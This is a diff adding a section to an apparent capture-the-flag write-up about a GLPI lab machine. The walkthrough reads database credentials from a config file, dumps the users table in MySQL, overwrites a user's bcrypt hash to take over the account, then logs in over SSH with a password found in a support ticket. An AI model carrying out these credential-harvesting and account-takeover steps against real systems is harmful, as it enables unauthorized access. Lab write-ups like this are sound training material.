@@ -103,6 +103,55 @@ Specfically, we are using the "netcat udp" format from revshells.com to perform 
 With success, we are able to achieve a reverse shell and are now logged in as a user, "www-data."
 
 
-We need to extract this end 
+Now, having gone through the subdomain pages on the target IP, we know that there is an available, "config" subdomain with potentially logins. Checking under the config subdomain, we find a file with a potential user:
 
+class DB extends DBmysql {
+   public $dbhost = 'localhost';
+   public $dbuser = 'glpi';
+   public $dbpassword = 'glpi_db_password';
+   public $dbdefault = 'glpi';
+   public $use_utf8mb4 = true;
+   public $allow_myisam = false;
+   public $allow_datetime = false;
+   public $allow_signed_keys = false;
+
+We can use the above login information to access the MySQL server with potential user information:
+
+		mysql -u glpi -p
+		password: glpi_db_password
+
+now that we are logged in to the server, we run some SQL commands:
+
+		show tables;  
+		use glpi;
+		select * from glpi_users;
+
+This shows us that there is an available user, "Betty"
+
+betty: $2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa
+
+
+Since this is a hashed password, we only need to update the password with our own in the same format. For this we will use a 10 round Bcrypt password generation for the word, "admin"
+
+password: $2y$10$sSTNswfHeYrJHJGge/7GWObn44oKEec2XR/EfIksJy9BdOsTpZiCC
+
+
+Now we navigate back to the original target IP and try to login with the "betty" account with the new user credentials:
+
+	username: betty
+	password: admin
+
+Sucecess! we are now logged in as betty on the GLPI home site. 
+
+On the home page there is a notification for a ticket alert for a missing password. We check on this ticket and find that the ticket was created by betty and the support team has changed her password to:
+
+	SnowboardSkateboardRoller234
+
+Let's try logging into the server through ssh with this credential:
+
+		ssh betty@192.168.178.242 
+
+Success, we are able to login and can now find our first flag in the home directory:
+
+==71742999d3e5e9809c8481419932d8c2==
 # Privilege Escalation
